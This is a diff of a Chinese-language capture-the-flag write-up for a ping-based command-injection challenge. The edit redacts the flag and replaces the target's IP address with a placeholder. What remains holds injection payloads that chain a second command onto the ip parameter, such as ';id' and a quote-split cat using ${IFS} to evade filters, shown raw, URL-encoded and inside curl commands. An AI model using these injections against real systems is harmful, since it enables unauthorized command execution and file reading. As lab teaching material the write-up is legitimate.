@@ -4,7 +4,7 @@
 
 - 题目名：`21-cmdi-ping-concat`
 - 参数：`ip`
-- Flag：`TOGOGO-flag{2cb78d42-6386-461a-8b26-1070cc647e15}`
+- Flag：`TOGOGO-flag{}`
   ;c'a't${IFS}s3cr3t_out.txt
 
 ---
@@ -84,13 +84,13 @@ ping -c 4 127.0.0.1;id
 把 payload URL 编码后访问：
 
 ```text
-http://47.120.76.57:34294/?ip=127.0.0.1%3Bc%27a%27t%24%7BIFS%7Ds3cr3t_out.txt
+http://目标地址/?ip=127.0.0.1%3Bc%27a%27t%24%7BIFS%7Ds3cr3t_out.txt
 ```
 
 如果成功，页面响应里会出现：
 
 ```text
-TOGOGO-flag{2cb78d42-6386-461a-8b26-1070cc647e15}
+TOGOGO-flag{}
 ```
 
 ---
@@ -98,13 +98,13 @@ TOGOGO-flag{2cb78d42-6386-461a-8b26-1070cc647e15}
 ## 手工复刻 2：curl
 
 ```bash
-curl 'http://47.120.76.57:34294/?ip=127.0.0.1%3Bc%27a%27t%24%7BIFS%7Ds3cr3t_out.txt'
+curl 'http://目标地址/?ip=127.0.0.1%3Bc%27a%27t%24%7BIFS%7Ds3cr3t_out.txt'
 ```
 
 也可以让 curl 自动编码参数：
 
 ```bash
-curl -G 'http://47.120.76.57:34294/' \
+curl -G 'http://目标地址/' \
   --data-urlencode "ip=127.0.0.1;c'a't\${IFS}s3cr3t_out.txt"
 ```
 
@@ -123,7 +123,7 @@ python3 main.py
 指定目标：
 
 ```bash
-python3 main.py --url http://47.120.76.57:34294/
+python3 main.py --url http://目标地址/
 ```
 
 指定 payload：
